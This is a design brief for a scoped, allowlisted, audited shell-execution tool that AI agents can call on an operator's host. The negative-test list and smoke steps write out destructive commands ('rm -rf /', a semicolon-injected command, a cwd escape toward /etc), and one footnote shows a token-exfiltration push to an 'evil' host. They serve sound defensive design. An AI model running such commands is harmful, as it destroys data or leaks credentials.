# stavR · `host_exec` MCP tool BOM

> Add a scoped, allowlisted, audited shell-execution tool to stavR so AI assistants (Cowork, Claude Code, external A2A peers) can drive routine host ops without the operator typing PowerShell. Designed against the no-go-list/ADR-022 principle: shell access is a deliberate expansion of trust surface, so it ships behind a strict allowlist + per-session trust scope + immutable audit log.

**Estimated wall-clock**: 4-6 hours sequential. Single CC worker, single PR.

**Stop conditions**: end of any phase if `npm test` regresses (must stay at 564+ passing), `npm run build` fails, or the allowlist enforcement is bypassable (verified via the negative-path tests in P5).

**Do NOT pause for approval** between phases. Commit + push at end of each. Open PR at end of P6.

---

## Why this bundle

After v0.4.1 polish merged, recovery work (truncated working tree, PM2 corrupted state, orphan daemon on port 7777, ecosystem.cjs typo) required the operator to drive ~12 PowerShell commands across 30 minutes. Cowork-side Claude could see the repo (via mounted bash) but could not run `git restore`, `npm run build`, `pm2 restart` on the operator's Windows host because stavR exposes no shell tool by design.

This BOM adds that capability — narrowly. Not a generic shell. Not `bash -c`. A typed-args allowlisted spawn primitive with audit and trust-scope gating.

**What's in:**
- `mcp__switch__host_exec({ command, args, cwd?, timeout_ms? })` tool
- Allowlist config + enforcement (default: `git`, `npm`, `pm2`, `taskkill`, `netstat`, `node` flagged off)
- Trust scope `host-ops` (15-min default TTL, granted manually)
- Audit log entries for every call (command + args + caller + exit + duration)
- Cross-platform exec primitive (Windows + Linux + macOS)
- Smoke + negative tests

**What's out:**
- Interactive/TTY commands (no `git rebase -i`, no editors)
- Long-running streams (use existing `worker_dispatch` for that)
- Shell metacharacter expansion (no pipes, no `&&`, no `||`, no redirection in tool input)
- Sudo / elevation / UAC prompts
- Any binary not in the allowlist

---

## Reference reading (read these first, in order)

1. `CLAUDE.md` — invariants, especially tests-are-derivative + never-lose-files
2. `adr/022-no-go-list.md` (or wherever the no-go list lives) — current shell-access stance
3. `src/mcp/` — where existing tools are registered. Pattern after `github_read_pr` handler.
4. `src/security/trust-scope.ts` (or equivalent) — existing scope-gate infrastructure
5. `src/persistence.ts` — event log schema, where audit entries land
6. `proposed/v0_5-steward-portability-bom.md` — Steward subprocess is the consumer-of-last-resort for host_exec; keep that integration in mind

---

## Don't touch

- `src/dashboard/*` — visuals frozen post-polish
- `src/steward/*` — v0.5 territory; this BOM does NOT pull Steward forward
- `src/worker/*` — workers don't run shell either; they spawn via PM2 already
- `migrations/` — unless adding a new audit table column; if you do, write idempotent SQL like the existing migrations
- `package.json` deps — likely NO new deps needed (`child_process.spawn` is built-in). If you find yourself reaching for `execa` or similar, justify in PR.

---

## Hard rules

1. **Tests are derivative** — if existing tests assert that stavR has no shell, those assertions are now stale per this BOM. Delete/rewrite them in the same commit as the code change.
2. **Never lose files** — bash heredoc for new files > 15KB; `stat -c %s` + `tail -5` verify before `git add` for files > 15KB after edit.
3. **No shell metacharacter expansion in tool input.** `args` is `string[]`, passed directly to `child_process.spawn` with `shell: false`. If the operator (or AI) wants pipes, they make two calls. This is non-negotiable — the whole point of the allowlist is that `git` cannot become `git ; rm -rf /`.
4. **Trust scope gate is a hard refuse, not a warning.** If no active `host-ops` scope exists, the handler returns `{ error: 'host-ops scope required' }` and audits the attempt — does NOT silently allow.
5. **Audit log is append-only.** Every call writes a row. No "rollback" — even denied calls get logged so we have evidence if an AI tried to escape the allowlist.
6. **DCO -s, per-phase commits, push at end of each phase.**

---

## P0 · Pre-flight (Kenneth, before CC kicks off)

~5 min. Kenneth confirms:

1. `git status` clean on `main` (current working tree, not the post-restore one — actually fix the truncation first if still pending)
2. `npm test` baseline passing (564+)
3. Trust scope infrastructure (`src/security/trust-scope.ts` or equivalent) currently exists. If not, this BOM blocks on that — flag and stop.
4. Dispatch CC: `claude --model opus` then paste the run prompt at the bottom of this brief.

---

## P1 · Allowlist + config schema (45 min)

**Files**: new `src/security/host-exec-allowlist.ts`, new `src/config/host-exec.ts`

### Sub-tasks

1. Define `AllowlistEntry` type:
   ```ts
   interface AllowlistEntry {
     command: string;              // binary name, no path
     allowed_args_patterns?: RegExp[];  // optional per-arg validation
     timeout_default_ms: number;
     description: string;          // human-readable rationale
   }
   ```
2. Default allowlist (ship in code, not config):
   - `git` — most subcommands ok. Banned: `git rebase -i` (interactive), `git config --global` (changes operator-wide identity), `git filter-repo` (history rewrite). Implementation: pattern-match arg[0].
   - `npm` — `install`, `ci`, `run <script>`, `test`, `build`, `version`, `audit`, `outdated`. Banned: `npm config set //*:_authToken` (no token writes), `npm publish` (no publishing).
   - `pm2` — `restart`, `status`, `logs`, `list`, `start`, `stop`, `delete`, `kill`, `save`, `reload`. Banned: `pm2 set` (no global config writes).
   - `taskkill` (Windows) — args must include `/pid <number>`. No `/im <name>` (could match anything).
   - `kill` (Linux/macOS) — args must include a numeric PID. No `kill -9 -1`.
   - `netstat` — read-only. Args: any.
   - `node` — disabled by default (set `enabled: false`). Reasoning: arbitrary JS execution defeats the allowlist.
3. Config loader: `loadHostExecConfig()` reads from `~/.stavr/host-exec.json` if present (operator overrides), otherwise uses defaults. Operator overrides can RESTRICT (set `enabled: false`) but cannot EXPAND beyond the hard-coded defaults — this prevents an attacker writing the config file to enable `rm`.
4. Validator: `validateAllowlistCall(command, args): { allowed: boolean, reason?: string }`. Returns reason on deny for audit clarity.

### Acceptance

- `npm test` adds new unit tests for `validateAllowlistCall`: each default entry has at least one positive + one negative case
- Manual: load default config, attempt to invoke `rm` → reason `'command not in allowlist'`; attempt `git rebase -i` → reason `'arg pattern denied'`
- No file > 15 KB; if approaching, split allowlist entries into separate files

### Commit

`feat(security): host-exec allowlist + config schema with hard-coded defaults`

---

## P2 · Tool registration + handler skeleton (1 h)

**Files**: new `src/mcp/handlers/host-exec.ts`, modify `src/mcp/tools.ts` (or wherever tools register)

### Sub-tasks

1. Tool schema (JSONSchema for the MCP tool definition):
   ```ts
   {
     name: 'host_exec',
     description: 'Run an allowlisted host command. Requires active host-ops trust scope. Audit logged.',
     inputSchema: {
       type: 'object',
       required: ['command'],
       properties: {
         command: { type: 'string', description: 'Binary name from allowlist' },
         args: { type: 'array', items: { type: 'string' }, default: [] },
         cwd: { type: 'string', description: 'Working dir; default = repo root' },
         timeout_ms: { type: 'number', minimum: 1000, maximum: 600000 }
       }
     }
   }
   ```
2. Handler skeleton (no actual exec yet — wires the registration):
   ```ts
   export async function handleHostExec(input: HostExecInput, ctx: ToolContext): Promise<HostExecResult> {
     // P4 will fill these in
     return { exit_code: -1, stdout: '', stderr: 'not implemented yet', duration_ms: 0, command_full: '' };
   }
   ```
3. Register the tool in the existing registration flow. Follow the pattern of an existing tool — `github_read_pr` is a good template.
4. Verify via `tools/list` MCP call that `host_exec` appears.

### Acceptance

- `npm test` passes (no new behavior, just registration)
- `npm run build` clean
- A new contract test: `host_exec` appears in the `tools/list` response

### Commit

`feat(mcp): host_exec tool registered (skeleton handler)`

---

## P3 · Cross-platform exec primitive (1.5 h)

**Files**: new `src/security/host-exec-runner.ts`

### Sub-tasks

1. Wrap `child_process.spawn` with these constraints:
   - `shell: false` (NON-NEGOTIABLE — prevents metacharacter expansion)
   - `windowsHide: true` on Windows
   - `cwd` defaults to `process.cwd()` if not specified; rejected if it escapes `process.cwd()` (no `../..`)
   - `timeout` from input or allowlist default
   - Stdin closed immediately (no interactive prompts can hang)
   - Stdout + stderr captured to byte buffers, capped at 1 MB each (truncate with `[... output truncated]` marker)
2. Cross-platform binary resolution:
   - On Windows, `git` might resolve to `git.exe` — let `spawn` handle path resolution
   - For `taskkill` (Windows-only) and `kill` (Unix-only), branch on `process.platform`
3. Result shape:
   ```ts
   interface HostExecResult {
     exit_code: number | null;     // null on timeout/signal
     stdout: string;
     stderr: string;
     stdout_truncated: boolean;
     stderr_truncated: boolean;
     duration_ms: number;
     timed_out: boolean;
     command_full: string;          // for audit, with args joined
   }
   ```
4. Defensive defaults:
   - All env vars cleared except `PATH`, `HOME`, `USERPROFILE`, `APPDATA` (no `GITHUB_TOKEN` leak, no `OPENAI_API_KEY` exfil)
   - If the command needs an env var, the operator must explicitly opt that var in via config

### Acceptance

- Unit tests: `runHostExec({ command: 'git', args: ['--version'] })` returns exit 0 with stdout
- Unit tests: timeout test — long-running command (use `node -e 'setInterval(()=>{},1000)'` with `node` temporarily enabled for the test) terminates at `timeout_ms`
- Unit tests: stdout-truncation — generate >1 MB output, assert truncation marker present
- Unit tests: cwd escape — pass `cwd: '../'` → rejected
- Build clean

### Commit

`feat(security): host-exec runner with shell:false + timeout + output caps`

---

## P4 · Trust scope + audit wiring (1 h)

**Files**: modify `src/mcp/handlers/host-exec.ts`, modify trust-scope checker, modify event log schema if needed

### Sub-tasks

1. In `handleHostExec`, before running:
   - Resolve current trust scopes for the caller (use existing trust-scope infrastructure)
   - If no active `host-ops` scope → return `{ error: 'host-ops scope required', error_code: 'SCOPE_DENIED' }` AND emit `event_type: 'host_exec_denied'` with reason
   - If allowlist validator rejects → return `{ error: <reason>, error_code: 'ALLOWLIST_DENIED' }` AND emit `event_type: 'host_exec_denied'` with reason
2. On allowed execution:
   - Emit `event_type: 'host_exec_started'` with `command`, `args_hash` (SHA256 of joined args), `caller`, `scope_id`
   - Run via P3 primitive
   - Emit `event_type: 'host_exec_completed'` with `exit_code`, `duration_ms`, `stdout_len`, `stderr_len`, `timed_out`
3. New trust scope: `host-ops`
   - Add to scope catalog (wherever scopes are defined — `src/security/scope-catalog.ts` or similar)
   - Default TTL: 15 minutes (configurable via `trust_scope_grant({ ttl_min: N })`)
   - Description for `trust_scope_propose`: "Allows host_exec calls — git/npm/pm2 routine ops. Allowlisted, audited."
4. `trust_scope_grant`/`revoke` flow — verify the scope can be granted + revoked + lists in `trust_scope_list`. No new tool surface needed; uses existing scope tooling.

### Acceptance

- `npm test` adds:
  - Test: no scope → `SCOPE_DENIED` + denied event emitted
  - Test: scope granted, allowed command → success + start/completed events emitted (verify via event log query)
  - Test: scope granted, denied command (e.g., `rm`) → `ALLOWLIST_DENIED` + denied event
- Manual smoke: `mcp__switch__trust_scope_propose({ scope: 'host-ops' })`, `trust_scope_grant`, then `host_exec({ command: 'git', args: ['status'] })` returns git status output

### Commit

`feat(security): host_exec scope gate + audit log integration`

---

## P5 · Tests + smoke (45 min)

**Files**: new `tests/security/host-exec.test.ts`, modify `tests/mcp/tool-registration.test.ts` if it exists

### Sub-tasks

1. Negative-path corpus (REQUIRED — these are the regression locks):
   - `rm` → ALLOWLIST_DENIED
   - `git ; rm -rf /` as `command: 'git ; rm -rf /'` → ALLOWLIST_DENIED (the semicolon won't be expanded since shell:false, but the command itself isn't in the allowlist anyway)
   - `git` with arg `rebase -i` → ALLOWLIST_DENIED (interactive pattern)
   - `git` with `cwd: '../../../etc'` → rejected
   - `node -e 'process.exit(0)'` with `node` disabled → ALLOWLIST_DENIED (enabled: false)
   - No active scope → SCOPE_DENIED
   - Active expired scope (TTL passed) → SCOPE_DENIED
2. Positive corpus:
   - `git --version` → exit 0, version in stdout
   - `npm --version` → exit 0
   - `pm2 status` → exit 0 (if PM2 not installed, skip with note)
3. Long-running termination:
   - Use a script that sleeps, set `timeout_ms: 500`, verify `timed_out: true` and `exit_code: null`
4. Audit log verification:
   - After 10 mixed calls (some allowed, some denied), query event log, verify 20 entries (each call = started + completed/denied)

### Acceptance

- All tests pass
- `npm test` total = previous baseline + new tests (currently 564 → expect 575ish after this BOM)
- `npm run build` clean

### Commit

`test(security): host_exec corpus — 10+ regression locks + audit log assertions`

---

## P6 · PR + smoke against running daemon (30 min)

### Sub-tasks

1. `npm test` full suite passes
2. `npm run build` clean
3. `pm2 restart stavr` (or `pm2 start ecosystem.config.cjs` if not registered)
4. Manual MCP smoke from this CC session:
   - `trust_scope_propose({ scope: 'host-ops', ttl_min: 15 })`
   - Operator approves
   - `host_exec({ command: 'git', args: ['log', '--oneline', '-3'] })` → see commit history
   - `host_exec({ command: 'rm', args: ['-rf', '/'] })` → SCOPE-allowed but ALLOWLIST_DENIED ✓
5. Open PR titled `feat(security): host_exec MCP tool — scoped + audited host command execution`
6. PR body must include:
   - The 6 default-allowlist entries with rationale
   - The negative-path test list (regression locks)
   - Cross-references to ADR-022 (no-go list) explaining how this expansion is bounded
   - A note: "Future Cowork chats can now drive routine ops (git/npm/pm2) directly. Operator must grant `host-ops` scope per session."
7. **Do NOT auto-merge.** Kenneth reviews and merges.

### Acceptance

- PR open with all the above
- CI green
- One manual MCP call from outside this run proves the tool works end-to-end

### Commit

(Final commits are in P5; P6 is smoke + PR open, no code commit unless smoke surfaces a bug, in which case fix in a same-phase commit.)

---

## Budget

- **Time**: 4-6h CC sequential
- **API cost**: ~$2-4 (Opus, mostly file edits + thinking on the allowlist)
- **LOC change**: ~600-1000 net in `src/security/`, `src/mcp/handlers/`, `tests/security/`
- **Token cap**: 800k

---

## Footgun appendix

1. **`shell: false` is non-negotiable.** If a junior dev or future CC turns it on for "convenience," the entire allowlist becomes worthless. Add a lint rule or runtime assertion: `if (spawnOptions.shell) throw new Error('host_exec must use shell:false')`.
2. **Allowlist override via config can RESTRICT, never EXPAND.** Hard-code the defaults; the config file is opt-OUT only. Otherwise an attacker writing `~/.stavr/host-exec.json` to add `rm` is a trivial escalation.
3. **Env var allowlist** prevents secret leak. If an AI tool reads `process.env.GITHUB_TOKEN` and exfils via `host_exec({ command: 'git', args: ['push', 'https://evil/repo'] })`, the audit log catches it AFTER the fact. The env scrub prevents the precondition.
4. **`taskkill` on Windows must require `/pid <number>`.** `taskkill /im node.exe /f` would kill EVERY node process on the host including the AI's own runtime. Validate `args[0] === '/pid'` and `args[1]` is numeric.
5. **PM2's `pm2 kill` is destructive (kills the god daemon).** It's allowed because it's recoverable, but the audit log should highlight kill calls. Maybe add an `important: true` flag for entries that involve `kill` in the command/args.
6. **Output truncation** — if a command produces > 1 MB, the AI sees `[... output truncated]` and might miss the actual answer. Caller's responsibility to stream via worker_dispatch for long outputs.
7. **Trust scope TTL is per-grant, not per-call.** After grant, EVERY call within the TTL window is allowed (subject to allowlist). Operator can revoke early. Don't add per-call confirmation — that would defeat the purpose. The audit log is the after-the-fact check.

---

## Open questions (FLAGGED — do not pre-answer)

### §1 — Should `node` be allowed at all?

Argument FOR: lets CC run quick `node -e '...'` for testing, JSON formatting, version checks. Useful.
Argument AGAINST: arbitrary JS execution defeats the allowlist (the JS can do anything `node` can do, including `fs.unlink`, `process.exit`, etc.).
**Default in P1**: `node` entry exists but `enabled: false`. Operator can flip via config. Document the trade-off in the entry's `description`.

### §2 — Cross-host federation: when stavR-A's host_exec is called via A2A from stavR-B, whose host runs the command?

Per ADR-035 federated stavR, A2A routes tool calls between peers. If peer B calls `host_exec` on peer A, A's host runs the command. That's correct semantically (each stavR controls its own host) but the trust scope must be granted by A's operator, not B's. The scope_id in the audit log must reflect the GRANTING operator.
**This BOM**: implement single-host only. Add a TODO comment in the handler: "Cross-host invocation requires scope-of-grant verification — defer to v0.7 A2A work."

### §3 — Should the allowlist be discoverable via a new tool?

Argument FOR: `mcp__switch__host_exec_capabilities()` lets AI tools check what's allowed before invoking, reducing denied-call noise in the audit log.
Argument AGAINST: it's also a recon vector for an attacker probing the surface.
**Default**: no separate tool. The denial error message includes `"command not in allowlist"` which is enough signal. If the audit log shows too much denial noise, add the discovery tool in a follow-up.

### §4 — What's the default TTL on `host-ops` scope?

15 minutes is a guess. Too short = operator constantly re-granting. Too long = a forgotten grant becomes a persistent backdoor.
**Default**: 15 min. Operator can override via `trust_scope_grant({ ttl_min: N })`. Surface the active TTL in `/dashboard/settings`.

### §5 — How does this interact with the Steward (v0.5)?

The v0.5 Steward subprocess might call host_exec itself for automatic recovery actions (e.g., self-restart on heap warning). If so, Steward needs its own `host-ops` scope, separately auditable.
**Defer**: this BOM doesn't grant Steward a scope. The v0.5 BOM should mention "Steward MAY consume host_exec once available; scope grant for Steward is a separate operator decision."

---

## Run prompt for CC (paste at start)

```
Read CLAUDE.md first. Then read proposed/host-exec-tool-bom.md and execute Phases 1 through 6 sequentially.

Pre-flight check: confirm trust scope infrastructure exists at src/security/ (or equivalent). If not, STOP and report — this BOM assumes it.

Rules:
- One commit per phase, DCO sign-off (-s).
- Don't pause for approval between phases. Commit + push at end of each.
- For any file >15KB after edit, run `stat -c %s file` + `tail -5 file` BEFORE git add. If truncated, recover via head + heredoc.
- `npm test` must pass after every commit. If a phase regresses, fix in the same phase commit before moving on.
- After P6 opens PR, output a final delta report and STOP. Don't auto-merge.

The brief is self-contained. Open questions §1-§5 are flagged — pick the lower-risk path during implementation and note in PR body, don't block. Go.
```

---

## End of brief
